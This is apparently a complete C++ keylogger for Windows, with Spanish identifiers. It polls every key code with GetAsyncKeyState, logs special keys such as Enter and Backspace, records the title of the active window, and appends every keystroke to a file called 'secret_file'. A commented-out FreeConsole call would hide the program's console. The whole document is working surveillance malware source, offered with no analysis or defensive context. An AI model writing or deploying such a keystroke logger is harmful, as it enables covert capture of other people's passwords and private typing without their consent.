#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>

using namespace std;

void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("secret_file", fstream::app);
	archivo << texto;
	archivo.close();
}

bool TeclasPulsadas(int tecla) {
	switch (tecla) {
	case VK_SPACE:
		cout << " ";
		EscribirArchivo(" ");
		return true;
		break;
	case VK_RETURN:
		cout << "\n";
		EscribirArchivo(" {INTRO} ");
		return true;
		break;
	case VK_SHIFT:
		cout << " {SHIFT} ";
		EscribirArchivo(" {SHIFT} ");
		return true;
		break;
	case VK_BACK:
		cout << " {RETROCESO} ";
		EscribirArchivo(" {RETROCESO} ");
		return true;
		break;

	default: return false;
	}
}

int main() {
	//FreeConsole();
	unsigned char key;
	while (TRUE) {
		Sleep(10);
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (TeclasPulsadas(key) == FALSE) {
					HWND ventana = NULL;
					ventana = GetForegroundWindow(); //Ventana activa que tiene capturada la entrada del teclado
					const int SizeOfTitleBarText = GetWindowTextLength(ventana);
					char *wnd_title = (char*)malloc(SizeOfTitleBarText+1);
					GetWindowText(ventana, wnd_title, SizeOfTitleBarText+1);
					cout << wnd_title;

					cout << key;
					ofstream archivo;
					archivo.open("secret_file", fstream::app);
					archivo << key;
					archivo.close();
				}
			}
		}
	}
}